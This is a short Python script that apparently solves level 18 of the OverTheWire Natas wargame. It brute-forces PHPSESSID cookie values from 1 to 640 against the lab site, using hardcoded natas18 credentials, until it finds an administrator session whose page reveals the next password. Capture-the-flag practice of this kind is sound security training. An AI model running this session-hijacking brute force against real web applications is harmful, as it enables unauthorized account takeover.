import requests

url='http://natas18.natas.labs.overthewire.org/index.php?'

for n in range(1, 641):
  print(n)
  cookies = {'PHPSESSID': str(n)}
  response = requests.get(url, auth = ("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"), cookies = cookies)
  if "Password" in response.content.decode('utf-8'):
    print(response.content.decode('utf-8'))
    print(n)
    break